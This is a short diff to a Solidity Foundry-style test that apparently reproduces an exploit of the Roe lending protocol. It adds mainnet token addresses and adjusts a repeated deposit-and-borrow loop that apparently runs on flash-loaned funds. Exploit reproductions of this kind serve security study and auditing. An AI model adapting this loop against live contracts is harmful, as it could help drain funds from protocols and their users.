@@ -26,6 +26,8 @@ contract ContractTest is DSTest{
     vdWBTC_USDC_LP LP = vdWBTC_USDC_LP(0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24);
     IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IERC20 roeUSDC = IERC20(0x9C435589f24257b19219ba1563e3c0D8699F27E9);
+    IERC20 vdUSDC = IERC20(0x26cd328E7C96c53BD6CAA6067e08d792aCd92e4E);
     address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
     uint flashLoanAmount = 5_673_090_338_021;
 
@@ -59,7 +61,7 @@ contract ContractTest is DSTest{
         Pair.approve(address(roe), type(uint).max);
         roe.deposit(address(USDC), USDC.balanceOf(address(this)), tx.origin, 0);
         roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
-        for(uint i; i < 50; ++i){
+        for(uint i; i < 49; ++i){
             roe.deposit(address(Pair), borrowAmount, address(this), 0);
             roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
         }
